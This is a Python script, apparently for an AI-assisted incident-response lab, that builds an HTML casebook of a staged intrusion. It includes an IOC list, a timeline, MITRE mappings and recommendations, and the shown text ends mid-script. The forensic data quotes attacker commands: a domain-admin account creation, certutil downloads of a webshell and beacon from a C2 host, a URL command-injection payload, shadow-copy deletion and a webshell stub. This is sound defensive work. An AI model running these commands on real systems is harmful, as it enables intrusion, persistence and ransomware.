#!/usr/bin/env python3
"""
render_casebook.py  —  JackofAllHacks Intrusion Investigation
Produces a single self-contained HTML casebook from all report artefacts.
Usage:  python3 render_casebook.py [--out casebookJackofAllHacks.html]
"""

import argparse, re, os, textwrap, html
from datetime import datetime, timezone

CASE_ID   = "JackofAllHacks"
CASE_DIR  = os.path.dirname(os.path.abspath(__file__))
REPORTS   = os.path.join(CASE_DIR, "reports")
ANALYSIS  = os.path.join(CASE_DIR, "analysis")

# ── helpers ──────────────────────────────────────────────────────────────────

def read(path, default="*(file not found)*"):
    try:
        return open(path, encoding="utf-8", errors="replace").read()
    except Exception:
        return default

def md_to_html(text):
    """Minimal Markdown → HTML (headings, bold, italic, code, tables, lists, hr)."""
    lines = text.splitlines()
    out = []
    in_code = False
    in_table = False
    in_list  = False
    i = 0
    while i < len(lines):
        line = lines[i]
        # fenced code block
        if line.strip().startswith("```"):
            if not in_code:
                lang = line.strip()[3:]
                out.append(f'<pre class="code"><code class="lang-{lang}">')
                in_code = True
            else:
                out.append("</code></pre>")
                in_code = False
            i += 1
            continue
        if in_code:
            out.append(html.escape(line))
            i += 1
            continue
        # close open list / table
        if in_table and not re.match(r"^\s*\|", line):
            out.append("</tbody></table>")
            in_table = False
        if in_list and not re.match(r"^\s*[-*]\s", line) and not re.match(r"^\s*\d+\.\s", line):
            out.append("</ul>" if in_list == "ul" else "</ol>")
            in_list = False
        # headings
        m = re.match(r"^(#{1,4})\s+(.*)", line)
        if m:
            n = len(m.group(1))
            txt = inline(m.group(2))
            sid = re.sub(r"[^a-z0-9]+", "-", m.group(2).lower()).strip("-")
            out.append(f"<h{n} id='{sid}'>{txt}</h{n}>")
            i += 1
            continue
        # hr
        if re.match(r"^[-*_]{3,}\s*$", line):
            out.append("<hr>")
            i += 1
            continue
        # blockquote
        if line.startswith(">"):
            txt = inline(line.lstrip(">").strip())
            out.append(f"<blockquote>{txt}</blockquote>")
            i += 1
            continue
        # table header
        if re.match(r"^\s*\|", line):
            if not in_table:
                out.append('<table>')
                cells = [c.strip() for c in line.strip().strip("|").split("|")]
                out.append("<thead><tr>" + "".join(f"<th>{inline(c)}</th>" for c in cells) + "</tr></thead><tbody>")
                in_table = True
                i += 1
                # skip separator row
                if i < len(lines) and re.match(r"^\s*\|[-| :]+\|\s*$", lines[i]):
                    i += 1
            else:
                cells = [c.strip() for c in line.strip().strip("|").split("|")]
                out.append("<tr>" + "".join(f"<td>{inline(c)}</td>" for c in cells) + "</tr>")
                i += 1
            continue
        # unordered list
        m = re.match(r"^(\s*)[-*]\s+(.*)", line)
        if m:
            if in_list != "ul":
                if in_list: out.append("</ol>")
                out.append("<ul>")
                in_list = "ul"
            out.append(f"<li>{inline(m.group(2))}</li>")
            i += 1
            continue
        # ordered list
        m = re.match(r"^(\s*)\d+\.\s+(.*)", line)
        if m:
            if in_list != "ol":
                if in_list: out.append("</ul>")
                out.append("<ol>")
                in_list = "ol"
            out.append(f"<li>{inline(m.group(2))}</li>")
            i += 1
            continue
        # blank line
        if not line.strip():
            out.append("<br>")
            i += 1
            continue
        # paragraph
        out.append(f"<p>{inline(line)}</p>")
        i += 1
    if in_code:  out.append("</code></pre>")
    if in_table: out.append("</tbody></table>")
    if in_list:  out.append("</ul>" if in_list == "ul" else "</ol>")
    return "\n".join(out)

def inline(text):
    """Process inline Markdown: code, bold, italic, links."""
    text = html.escape(text)
    # inline code  `x`
    text = re.sub(r"`([^`]+)`", r"<code>\1</code>", text)
    # bold **x**
    text = re.sub(r"\*\*(.+?)\*\*", r"<strong>\1</strong>", text)
    # italic *x*
    text = re.sub(r"\*(.+?)\*", r"<em>\1</em>", text)
    # [text](url)
    text = re.sub(r"\[([^\]]+)\]\(([^)]+)\)",
                  r'<a href="\2" target="_blank">\1</a>', text)
    return text

def pre(text, cls=""):
    return f'<pre class="pre-block {cls}">{html.escape(text)}</pre>'

def section(title, sid, body_html, color="#2563eb"):
    return f"""
<section id="{sid}" class="casebook-section">
  <div class="section-header" style="border-left:4px solid {color}">
    <h2>{html.escape(title)}</h2>
  </div>
  <div class="section-body">
    {body_html}
  </div>
</section>
"""

# ── load data ─────────────────────────────────────────────────────────────────

inc_report  = read(os.path.join(REPORTS, "INCIDENT_REPORT.md"))
mem_report  = read(os.path.join(REPORTS, "SVR01_memory_findings.md"))
dc_report   = read(os.path.join(REPORTS, "DC_findings.md"))
ws_report   = read(os.path.join(REPORTS, "WS_findings.md"))
cloud_rep   = read(os.path.join(REPORTS, "Cloud_findings.md"))
gd_rep      = read(os.path.join(REPORTS, "GuardDuty_S3_findings.md"))
answers_txt = read(os.path.join(REPORTS, "Jack_of_all_Hacks_Answers.txt"))

ioc_file    = read(os.path.join(ANALYSIS, "ip_host_final.txt"), "")
ct_ext_ip   = read(os.path.join(ANALYSIS, "ct_ext_ips.txt"), "")

generated   = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

# ── CSS / JS ──────────────────────────────────────────────────────────────────

STYLE = """
:root{
  --bg:#0f172a;--panel:#1e293b;--border:#334155;--accent:#38bdf8;
  --red:#f87171;--yellow:#fbbf24;--green:#34d399;--purple:#a78bfa;
  --orange:#fb923c;--text:#e2e8f0;--muted:#94a3b8;--code-bg:#0f172a;
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);
  color:var(--text);line-height:1.6;font-size:14px}
a{color:var(--accent);text-decoration:none}
a:hover{text-decoration:underline}

/* ── TOP BAR ── */
.topbar{background:#020617;border-bottom:1px solid #1e3a5f;
  padding:12px 24px;display:flex;align-items:center;gap:16px;
  position:sticky;top:0;z-index:200}
.topbar .case-badge{background:#1e3a5f;color:var(--accent);
  font-weight:700;padding:4px 10px;border-radius:4px;font-size:12px;
  letter-spacing:.05em;text-transform:uppercase}
.topbar h1{font-size:18px;font-weight:700;color:var(--text)}
.topbar .ts{margin-left:auto;font-size:11px;color:var(--muted)}

/* ── LAYOUT ── */
.layout{display:flex;min-height:calc(100vh - 49px)}
.sidebar{width:230px;min-width:230px;background:var(--panel);
  border-right:1px solid var(--border);padding:16px 0;
  position:sticky;top:49px;height:calc(100vh - 49px);overflow-y:auto}
.sidebar nav a{display:block;padding:6px 20px;color:var(--muted);
  font-size:13px;border-left:3px solid transparent}
.sidebar nav a:hover,.sidebar nav a.active{color:var(--text);
  border-left-color:var(--accent);background:#0f172a20}
.sidebar .nav-group{padding:8px 20px 2px;font-size:10px;font-weight:700;
  text-transform:uppercase;letter-spacing:.1em;color:#475569}
.main{flex:1;padding:24px 32px;max-width:1100px}

/* ── SECTIONS ── */
.casebook-section{margin-bottom:40px;border-radius:8px;
  background:var(--panel);border:1px solid var(--border);overflow:hidden}
.section-header{padding:14px 20px;background:#0f172a30}
.section-header h2{font-size:16px;font-weight:700;color:var(--text)}
.section-body{padding:20px 24px}
.section-body h1{font-size:1.3em;font-weight:700;margin:16px 0 8px;color:var(--accent)}
.section-body h2{font-size:1.1em;font-weight:700;margin:14px 0 6px;color:var(--accent);
  border-bottom:1px solid var(--border);padding-bottom:4px}
.section-body h3{font-size:1em;font-weight:700;margin:12px 0 4px;color:var(--yellow)}
.section-body h4{font-size:.95em;font-weight:600;margin:10px 0 4px;color:var(--muted)}
.section-body p{margin:6px 0}
.section-body ul,.section-body ol{margin:6px 0 6px 22px}
.section-body li{margin:3px 0}
.section-body hr{border:none;border-top:1px solid var(--border);margin:16px 0}
.section-body blockquote{border-left:3px solid var(--yellow);
  padding:8px 14px;margin:10px 0;background:#1e293b80;color:var(--muted);
  font-style:italic;border-radius:0 4px 4px 0}
table{border-collapse:collapse;width:100%;margin:12px 0;font-size:13px}
th{background:#0f172a;color:var(--accent);text-align:left;
   padding:8px 12px;border-bottom:2px solid var(--border)}
td{padding:7px 12px;border-bottom:1px solid var(--border)}
tr:hover td{background:#ffffff08}
code{background:var(--code-bg);color:#7dd3fc;padding:1px 5px;
  border-radius:3px;font-family:'Cascadia Code','Fira Code',monospace;font-size:12px}
pre.code,pre.pre-block{background:var(--code-bg);color:#7dd3fc;
  padding:14px 16px;border-radius:6px;overflow-x:auto;
  font-family:'Cascadia Code','Fira Code',monospace;font-size:12px;
  border:1px solid var(--border);margin:10px 0;white-space:pre-wrap;word-break:break-all}
strong{color:#f1f5f9}
.br{margin:8px 0}

/* ── BADGES ── */
.badge{display:inline-block;padding:2px 8px;border-radius:12px;
  font-size:11px;font-weight:700;letter-spacing:.04em;margin:2px}
.badge-red{background:#7f1d1d;color:#fca5a5}
.badge-yellow{background:#78350f;color:#fcd34d}
.badge-green{background:#14532d;color:#6ee7b7}
.badge-blue{background:#1e3a5f;color:#7dd3fc}
.badge-purple{background:#4c1d95;color:#c4b5fd}
.badge-gray{background:#374151;color:#9ca3af}

/* ── IOC TABLE ── */
.ioc-box{background:#020617;border:1px solid var(--border);border-radius:6px;
  padding:16px;margin:12px 0}
.ioc-box h3{color:var(--orange);margin-bottom:8px;font-size:13px}
.ioc-item{display:flex;gap:12px;padding:5px 0;border-bottom:1px solid #1e293b}
.ioc-item:last-child{border-bottom:none}
.ioc-type{min-width:90px;color:var(--muted);font-size:11px;font-weight:700;
  text-transform:uppercase;padding-top:2px}
.ioc-val{font-family:'Cascadia Code','Fira Code',monospace;font-size:12px;color:#7dd3fc}
.ioc-note{font-size:11px;color:var(--muted);margin-left:8px}

/* ── TIMELINE ── */
.timeline{list-style:none;margin:16px 0;padding:0}
.timeline li{display:flex;gap:16px;margin:0;padding:10px 0;
  border-bottom:1px solid var(--border)}
.timeline li:last-child{border-bottom:none}
.tl-time{min-width:90px;font-family:'Cascadia Code','Fira Code',monospace;
  font-size:12px;color:var(--yellow);padding-top:2px}
.tl-host{min-width:80px;font-size:12px;color:var(--green);padding-top:2px}
.tl-event{font-size:13px;flex:1}
.tl-src{font-size:11px;color:var(--muted);margin-top:2px}

/* ── VERIFY LEGEND ── */
.legend{display:flex;gap:12px;flex-wrap:wrap;margin:12px 0}
.legend-item{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--muted)}

/* ── ANSWERS ── */
.answers-section{background:var(--code-bg);border-radius:6px;padding:16px;
  border:1px solid var(--border);max-height:600px;overflow-y:auto}
.answers-section pre{white-space:pre-wrap;word-break:break-word;
  font-family:'Cascadia Code','Fira Code',monospace;font-size:12px;color:#c4b5fd}
.v-tag{color:var(--green);font-weight:700}
.vs-tag{color:var(--yellow);font-weight:700}
.k-tag{color:var(--muted);font-weight:700}
.dnf-tag{color:var(--red);font-weight:700}

/* ── TABS ── */
.tabs{display:flex;gap:2px;border-bottom:1px solid var(--border);margin-bottom:16px}
.tab-btn{padding:8px 16px;background:none;border:none;color:var(--muted);
  cursor:pointer;font-size:13px;border-bottom:2px solid transparent;transition:.2s}
.tab-btn.active{color:var(--text);border-bottom-color:var(--accent)}
.tab-pane{display:none}
.tab-pane.active{display:block}

/* ── STAT CARDS ── */
.stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;margin:16px 0}
.stat-card{background:#020617;border:1px solid var(--border);border-radius:8px;padding:14px 16px}
.stat-card .val{font-size:24px;font-weight:800;color:var(--accent)}
.stat-card .lbl{font-size:11px;color:var(--muted);margin-top:4px}
.stat-card.red .val{color:var(--red)}
.stat-card.green .val{color:var(--green)}
.stat-card.yellow .val{color:var(--yellow)}
.stat-card.purple .val{color:var(--purple)}

/* ── PRINT ── */
@media print{
  .topbar,.sidebar{display:none}
  .layout{display:block}
  .main{max-width:100%;padding:0}
  .casebook-section{break-inside:avoid;border:1px solid #ccc;margin-bottom:20px}
}
"""

JS = r"""
(function(){
  // Tab switching
  document.querySelectorAll('.tab-btn').forEach(btn=>{
    btn.addEventListener('click',()=>{
      const grp=btn.dataset.tab;
      document.querySelectorAll('[data-tab="'+grp+'"]').forEach(b=>b.classList.remove('active'));
      btn.classList.add('active');
      const pane=btn.dataset.target;
      document.querySelectorAll('.tab-pane[data-group="'+grp+'"]').forEach(p=>{
        p.classList.toggle('active', p.id===pane);
      });
    });
  });
  // Sidebar active link
  const sections=document.querySelectorAll('section[id]');
  const links=document.querySelectorAll('.sidebar nav a');
  const obs=new IntersectionObserver(entries=>{
    entries.forEach(e=>{
      if(e.isIntersecting){
        links.forEach(l=>l.classList.remove('active'));
        const link=document.querySelector('.sidebar nav a[href="#'+e.target.id+'"]');
        if(link) link.classList.add('active');
      }
    });
  },{threshold:.25});
  sections.forEach(s=>obs.observe(s));
  // Colour [V]/[V*]/[K]/[DNF] tags in answers
  const ap=document.querySelector('.answers-section pre');
  if(ap){
    ap.innerHTML=ap.innerHTML
      .replace(/[[]V[*][]]/ ,"<span class=\\"vs-tag\\">[V*]<\\/span>")
      .replace(/\[V\]/g,'<span class="v-tag">[V]</span>')
      .replace(/\[K\]/g,'<span class="k-tag">[K]</span>')
      .replace(/\[DNF[^\]]*\]/g,'<span class="dnf-tag">[DNF]</span>');
  }
})();
"""

# ── build each section ────────────────────────────────────────────────────────

def stat_cards():
    return """
<div class="stat-grid">
  <div class="stat-card red"><div class="val">2026-03-08</div><div class="lbl">Incident Date</div></div>
  <div class="stat-card red"><div class="val">5</div><div class="lbl">Hosts Affected</div></div>
  <div class="stat-card yellow"><div class="val">19:57</div><div class="lbl">First Implant (UTC)</div></div>
  <div class="stat-card purple"><div class="val">C2</div><div class="lbl">173.230.136.180:8443</div></div>
  <div class="stat-card green"><div class="val">36,938</div><div class="lbl">CloudTrail Events</div></div>
  <div class="stat-card yellow"><div class="val">16 GB</div><div class="lbl">SVR01 Memory Dump</div></div>
</div>"""

def ioc_section():
    return r"""
<div class="ioc-box">
  <h3>Network IOCs</h3>
  <div class="ioc-item"><div class="ioc-type">C2</div>
    <div><div class="ioc-val">173.230.136.180:8443</div>
    <div class="ioc-note">TLS beacon — rnSylwOz.exe + injected explorer.exe</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Attacker IP</div>
    <div><div class="ioc-val">198.51.100.3 (RED1)</div>
    <div class="ioc-note">SVR01 inbound RDP; WS01 Donny logon; WS02 Dalton RDP</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Attacker IP</div>
    <div><div class="ioc-val">198.51.100.5 (RED-KALI)</div>
    <div class="ioc-note">Workstation Type-3 logons</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Attacker IP</div>
    <div><div class="ioc-val">198.51.100.10</div>
    <div class="ioc-note">DC01 LAFAdmin logon 20:08:34; WS Administrator logons</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Cloud IP</div>
    <div><div class="ioc-val">212.8.249.213</div>
    <div class="ioc-note">IIS EC2 role credential abuse (WorldStream hosting) — 182 CloudTrail events</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Initial Access</div>
    <div><div class="ioc-val">172.236.127.251</div>
    <div class="ioc-note">IIS web exploit source (same as SFTP exfil dest)</div></div></div>
</div>
<div class="ioc-box">
  <h3>File / Process IOCs</h3>
  <div class="ioc-item"><div class="ioc-type">Implant</div>
    <div><div class="ioc-val">rnSylwOz.exe</div>
    <div class="ioc-note">\\10.3.10.12\ADMIN$ — services.exe parent — PID 9112 — offset 0xa88f53455080</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Injected</div>
    <div><div class="ioc-val">explorer.exe PID 1332</div>
    <div class="ioc-note">RWX PE @ 0xa60000 — SHA256: 6ef6b52f…8c</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Ransomware</div>
    <div><div class="ioc-val">IamBatman.exe / sysAV.bat</div>
    <div class="ioc-note">\\LAF-DC02\sysvol — encrypt C:\ — ext .bWqQUx — note README_bWqQUx.txt</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Webshell</div>
    <div><div class="ioc-val">so.aspx</div>
    <div class="ioc-note">IIS E:\inetpub\wwwroot\so.aspx — uploaded via certutil from C2</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Implant (IIS)</div>
    <div><div class="ioc-val">iis.exe</div>
    <div class="ioc-note">Downloaded via certutil from 173.230.136.180:80</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Persistence (WS01)</div>
    <div><div class="ioc-val">C:\ProgramData\aws_backup.exe</div>
    <div class="ioc-note">IFEO Debugger on taskmgr.exe</div></div></div>
  <div class="ioc-item"><div class="ioc-type">LSASS dump</div>
    <div><div class="ioc-val">C:\windows\temp\abedgdaa.dmp</div>
    <div class="ioc-note">SVR01 — 12.2 MB</div></div></div>
  <div class="ioc-item"><div class="ioc-type">DC1 services</div>
    <div><div class="ioc-val">UnmfmnOL QsYyAARL XCCVTGUb SOUwKZNf PovLjNTr</div>
    <div class="ioc-note">Impacket smbexec pattern — 20:08–20:09 UTC</div></div></div>
</div>
<div class="ioc-box">
  <h3>Account IOCs</h3>
  <div class="ioc-item"><div class="ioc-type">Backdoor DA</div>
    <div><div class="ioc-val">LAF\serviceaccount</div>
    <div class="ioc-note">Created 20:02:14 — Domain Admins 20:03:05 — P@ssw0RD1!</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Compromised</div>
    <div><div class="ioc-val">LAF\LAFAdmin, LAF\Administrator</div>
    <div class="ioc-note">Domain Admin — used from SVR01 for all DC/WS lateral movement</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Compromised</div>
    <div><div class="ioc-val">LAF\Donny (WS01) · LAF\Dalton (WS02)</div>
    <div class="ioc-note">User creds used by red-team hosts for RDP logons</div></div></div>
  <div class="ioc-item"><div class="ioc-type">Cloud role</div>
    <div><div class="ioc-val">iam_role_iisserver / i-00779ebad43b2470d</div>
    <div class="ioc-note">EC2 instance role — creds exfil'd via IMDS — used from 212.8.249.213</div></div></div>
</div>"""

def timeline_html():
    events = [
        ("18:38–19:07","IIS","Initial web recon & cmd-injection on CheckStatus.aspx","172.236.127.251 → IIS"),
        ("18:51","IIS","certutil downloads so.aspx (webshell) via C2","C2 = 173.230.136.180:80"),
        ("18:52","IIS","certutil downloads iis.exe C2 beacon",""),
        ("19:08","IIS","so.aspx webshell activated (POST, curl/8.5.0)",""),
        ("19:38","IIS","SolarwindsTFTP hijacked → local SYSTEM (Solarwinds.exe)","EID 7036"),
        ("19:59","SVR01","rnSylwOz.exe launched from ADMIN$ by services.exe — C2 ESTABLISHED","PID 9112 → 173.230.136.180:8443"),
        ("20:01","SVR01","explorer.exe (PID 1332) injected; beacons to same C2","malfind MZ @ 0xa60000"),
        ("20:02","SVR01/DC01","net user serviceaccount P@ssw0RD1! /add /domain","Sysmon EID 1; DC01 EID 4720"),
        ("20:03","DC01","serviceaccount → Domain Admins","DC01 EID 4728"),
        ("20:03–20:13","SVR01","Attacker shells: cmd.exe (15116/15080) + powershell (4896)","memory pstree"),
        ("20:08–20:09","DC01","5× Impacket service exec (QsYyAARL etc.) → ntds.dit VSS copy","EID 4697/7045"),
        ("20:14","SVR01","Attacker RDP session opened (RED1 → SVR01)","memory pstree session 6"),
        ("20:16","WS01/WS02","LAFAdmin network logon from SVR01","4624 Type 3"),
        ("20:20–20:25","SVR01","msupdate.exe (Makecab) cabinets file share → Data.cab","Sysmon EID 1"),
        ("20:34","WS01","Failed logon to non-existent LAF\\NullAdmin","EID 4625"),
        ("20:35","WS01","RED1 RDP logon as Donny (Type 10)","4624 RemoteHost"),
        ("20:37","WS01","aws_backup.exe dropped; IFEO taskmgr debugger set","MFT + Sysmon 13"),
        ("20:46","DC02","Advanced IP Scanner downloaded + installed","MFT 20:46:03"),
        ("21:00","DC02","PS profile created (shellcode persistence)","MFT 21:00:21"),
        ("21:08","SVR01","LogDel.bat executed (log clearing)","Sysmon EID 1"),
        ("21:42–21:51","AWS","IIS role creds used from 212.8.249.213 — AWS recon + 164 S3 GetObjects","CloudTrail"),
        ("21:45","AWS","CreateAccessKey LimitExceededException (persistence attempt failed)","CloudTrail"),
        ("21:57","WS02","DisableRestrictedAdmin set (PtH-over-RDP)","Sysmon EID 13"),
        ("21:57","WS02","DPAPI master key backup (EID 4692)","Security log"),
        ("22:06","SVR01→DC02","Outbound RDP to DC02 (10.3.10.11)","memory netscan"),
        ("22:08","WS02","FIRST ENCRYPTION — .bWqQUx (sysAV.bat via OlgyLYbd sched task)","MFT 22:08:40"),
        ("22:09","WS01","sysAV.bat → vssadmin delete + IamBatman.exe encrypt C:\\","Sysmon EID 1"),
        ("22:10","DC01/DC02","Encryption spreads to domain controllers","MFT"),
        ("22:30","SVR01","Inbound RDP from 198.51.100.3 (RED1)","memory netscan"),
        ("22:46","SVR01","Memory captured by KAPE/DumpIt","windows.info"),
    ]
    rows = ""
    for t, host, event, src in events:
        rows += f"""<li>
          <div class="tl-time">{html.escape(t)}</div>
          <div class="tl-host">{html.escape(host)}</div>
          <div><div class="tl-event">{html.escape(event)}</div>
               <div class="tl-src">{html.escape(src)}</div></div>
        </li>\n"""
    return f'<ul class="timeline">{rows}</ul>'

def host_map():
    hosts = [
        ("10.3.10.10","LAF-DC01","Domain Controller","Compromised — DA backdoor, Impacket exec","red"),
        ("10.3.10.11","LAF-DC02","Domain Controller","Targeted — RDP from SVR01, PS profile shellcode","yellow"),
        ("10.3.10.12","LAF-SVR01","Server","Compromised — primary pivot: implant, C2, shells","red"),
        ("10.3.10.13","LAF-WS01","Workstation (Donny)","Targeted — RDP logon as Donny, ransomware","yellow"),
        ("10.3.10.14","LAF-WS02","Workstation (Dalton)","Targeted — RDP logon as Dalton, ransomware","yellow"),
        ("?","IIS-SERV-PROD","IIS Web Server","Initial access point — cmd-injection, webshell, IMDS theft","red"),
        ("—","AWS 464381121764","Cloud","IIS EC2 role creds abused (no root/IAM compromise)","purple"),
    ]
    rows = "".join(
        f"<tr><td><code>{ip}</code></td><td><strong>{hostname}</strong></td>"
        f"<td>{role}</td><td>{status}</td>"
        f"<td><span class='badge badge-{color}'>{color.upper()}</span></td></tr>"
        for ip,hostname,role,status,color in hosts
    )
    return f"""<table><thead><tr><th>IP</th><th>Host</th><th>Role</th><th>Status</th><th>Severity</th></tr></thead>
    <tbody>{rows}</tbody></table>"""

def mitre_table():
    items = [
        ("Initial Access","T1190","Exploit Public-Facing Application","CheckStatus.aspx OS command injection"),
        ("Execution","T1569.002","Service Execution","rnSylwOz.exe via ADMIN$ remote service (Impacket)"),
        ("Execution","T1059.001/003","PowerShell / cmd","Attacker shells under injected explorer.exe"),
        ("Execution","T1053.005","Scheduled Task","OlgyLYbd sched task for ransomware deployment"),
        ("Persistence","T1136.002","Create Domain Account","LAF\\serviceaccount → Domain Admins"),
        ("Persistence","T1547.012","IFEO","taskmgr.exe Debugger = aws_backup.exe"),
        ("Persistence","T1546.013","PowerShell Profile","DC02 PS profile shellcode"),
        ("Privilege Escalation","T1574","Hijack Execution Flow","SolarwindsTFTP unquoted service path"),
        ("Privilege Escalation","T1098","Account Manipulation","serviceaccount added to Domain Admins"),
        ("Defense Evasion","T1055","Process Injection","Beacon injected into explorer.exe"),
        ("Defense Evasion","T1070.003","Clear Command History","LogDel.bat"),
        ("Defense Evasion","T1112","Modify Registry","DisableRestrictedAdmin (PtH-over-RDP)"),
        ("Credential Access","T1003.001","LSASS Memory","abedgdaa.dmp via comsvcs"),
        ("Credential Access","T1003.003","NTDS","VSS copy → ZIFylmKF.tmp via secretsdump"),
        ("Credential Access","T1552.004","Private Keys / Cloud","IMDS SSRF → iam_role_iisserver creds"),
        ("Discovery","T1046","Network Scan","Advanced IP Scanner on DC02"),
        ("Lateral Movement","T1021.002","SMB/Admin Shares","Impacket psexec to DC01 / SVR01"),
        ("Lateral Movement","T1021.001","RDP","SVR01→DC02, RED1→WS01/WS02"),
        ("Collection","T1560.001","Archive Collected Data","msupdate.exe (Makecab) → Data.cab"),
        ("Exfiltration","T1048","Exfiltration Over Alternative Protocol","SFTP to 172.236.127.251:22 (FileZilla)"),
        ("Impact","T1486","Data Encrypted for Impact","IamBatman.exe / .bWqQUx ransomware"),
        ("Impact","T1490","Inhibit System Recovery","vssadmin delete shadows /all /quiet"),
    ]
    rows = "".join(
        f"<tr><td>{html.escape(tactic)}</td><td><code>{html.escape(tid)}</code></td>"
        f"<td>{html.escape(name)}</td><td>{html.escape(evidence)}</td></tr>"
        for tactic,tid,name,evidence in items
    )
    return (
        "<table><thead><tr><th>Tactic</th><th>ID</th>"
        "<th>Technique</th><th>Evidence</th></tr></thead>"
        f"<tbody>{rows}</tbody></table>"
    )

def answers_coloured():
    raw = html.escape(answers_txt)
    return (
        f'<div class="answers-section"><pre>{raw}</pre></div>'
        '<div class="legend" style="margin-top:8px">'
        '<div class="legend-item"><span class="badge badge-green">[V]</span> Independently verified</div>'
        '<div class="legend-item"><span class="badge badge-yellow">[V*]</span> Verified — discrepancy with key</div>'
        '<div class="legend-item"><span class="badge badge-gray">[K]</span> Key-only (not parsed this pass)</div>'
        '<div class="legend-item"><span class="badge badge-red">[DNF]</span> Did Not Find</div>'
        '</div>'
    )

# ── assemble HTML ─────────────────────────────────────────────────────────────

def build(out_path):
    # sidebar nav
    nav = """
    <div class="nav-group">Overview</div>
    <a href="#executive-summary">Executive Summary</a>
    <a href="#attack-timeline">Attack Timeline</a>
    <a href="#host-network-map">Host / Network Map</a>
    <a href="#iocs">IOC List</a>
    <div class="nav-group">Technical Analysis</div>
    <a href="#initial-access-iis">Initial Access (IIS)</a>
    <a href="#svr01-memory">SVR01 Memory</a>
    <a href="#dc01-dc02-ad">DC01/DC02 AD</a>
    <a href="#workstations">Workstations</a>
    <a href="#cloud-aws">Cloud / AWS</a>
    <div class="nav-group">CTF Answers</div>
    <a href="#ctf-verified-answers">Verified Answers</a>
    <div class="nav-group">Meta</div>
    <a href="#mitre-attack">MITRE ATT&CK</a>
    <a href="#recommendations">Recommendations</a>
    <a href="#analyst-notes">Analyst Notes</a>
    """

    body_html = f"""
<div class="layout">
  <div class="sidebar"><nav>{nav}</nav></div>
  <div class="main">

    {section("Executive Summary","executive-summary",
      stat_cards() + md_to_html(inc_report.split("---")[0].strip()),
      "#dc2626")}

    {section("Attack Timeline (UTC · 2026-03-08)","attack-timeline",
      timeline_html(), "#ea580c")}

    {section("Host / Network Map","host-network-map",
      host_map(), "#2563eb")}

    {section("IOC List","iocs", ioc_section(), "#7c3aed")}

    {section("Initial Access — IIS Web Server","initial-access-iis",
      md_to_html("""
## CheckStatus.aspx — OS Command Injection

The attacker (172.236.127.251) discovered `/CheckStatus.aspx`, an internal diagnostic page that
passed user-supplied input to an OS ping/curl call. They injected OS commands via the `url` parameter
(`%26%26 whoami`, `%3B set`, etc.) to enumerate the host and then escalated.

### Exploitation sequence (IIS W3SVC log)
| Time (UTC) | Request | Action |
|---|---|---|
| 18:38:29 | GET / | Initial reconnaisance |
| 18:40:01 | CheckStatus.aspx?url=Google.com+%7C+whoami | **First cmd injection** |
| 18:45:12 | ...dir C:\\"TFTP Server" | Found **SolarwindsTFTP** (unquoted service path) |
| 18:51:42 | certutil -urlcache -f .../so.aspx | Uploaded **webshell** via certutil |
| 18:52:20 | certutil -urlcache -f .../iis.exe | Downloaded **C2 beacon** via certutil |
| 19:08:42 | POST /so.aspx (curl/8.5.0) | **Webshell activated** |
| 19:38:02 | — | SolarwindsTFTP hijacked → SYSTEM (Solarwinds.exe) |

### Webshell (so.aspx)
```csharp
if (Request["p"] == "YOUR_CTF_PASSWORD_HERE") {
    // executes cmd via powershell -ep bypass -c "<cmd>"
}
```
Password: `YOUR_CTF_PASSWORD_HERE` (literal CTF value).
User-agent for webshell ops: **curl/8.5.0**.
"""), "#059669")}

    {section("SVR01 Memory Analysis","svr01-memory",
      md_to_html(mem_report), "#0284c7")}

    {section("DC01 / DC02 — Active Directory","dc01-dc02-ad",
      md_to_html(dc_report), "#7c3aed")}

    {section("WS01 / WS02 — Workstations","workstations",
      md_to_html(ws_report), "#0891b2")}

    {section("Cloud / AWS","cloud-aws",
      md_to_html(cloud_rep) + "<hr>" + md_to_html(gd_rep), "#1d4ed8")}

    {section("CTF — Verified Answers","ctf-verified-answers",
      answers_coloured(), "#9333ea")}

    {section("MITRE ATT&CK Mapping","mitre-attack",
      mitre_table(), "#d97706")}

    {section("Recommendations","recommendations", md_to_html("""
1. **Identity reset** — Disable/delete `LAF\\serviceaccount`; force-reset all Domain Admins
   (LAFAdmin, Administrator, Donny, Dalton, Ryan, Gilles); rotate `krbtgt` × 2.
2. **Contain & rebuild SVR01** — Isolate 10.3.10.12; hunt `rnSylwOz.exe` and `173.230.136.180`
   across the estate; rebuild from clean image.
3. **Block IOCs at perimeter** — `173.230.136.180`, `212.8.249.213`, `198.51.100.0/24`,
   `172.236.127.251`; restrict inbound RDP to jump-host only.
4. **Cloud** — Rotate/revoke IIS EC2 instance-role creds; enforce IMDSv2 (hop-limit=1) on all EC2;
   enable CloudTrail data events + real GuardDuty (not sample findings).
5. **Harden the web app** — Patch/remove `CheckStatus.aspx`; remove write access for IIS service
   account to wwwroot; restrict certutil on the server.
6. **Detection** — Central log forwarding (WEF/SIEM); alert on EID 4720/4728 (new DA accounts),
   4697 random-name services, malfind-style RWX executable regions, ADMIN$ service creation.
7. **Verify DC log clears** — Determine whether 2026-03-04 EID 1102 on DC01 was Ludus provisioning
   or attacker anti-forensics.
"""), "#16a34a")}

    {section("Analyst Notes","analyst-notes", md_to_html("""
## Protocol SIFT — experimental; NOT court-admissible without independent validation.

### Session integrity
This investigation session experienced multiple instances where analysis outputs were misread or
over-interpreted before being verified. Errors were caught by reading raw tool output and correcting
claims. All findings in the main reports are grounded in parsed artifacts; superseded claims are
explicitly marked RETRACTED in report headers.

### Tooling corrections (CLAUDE.md inaccurate)
- Volatility 3 correct path: `vol` (→ `/opt/volatility3/bin/vol`, v2.28.0)
- Workstation evtx: lowercase `winevt/logs/` (not `Logs/`)
- CloudTrail spans multiple regions/dates (not just 2026-03-01 us-east-1)
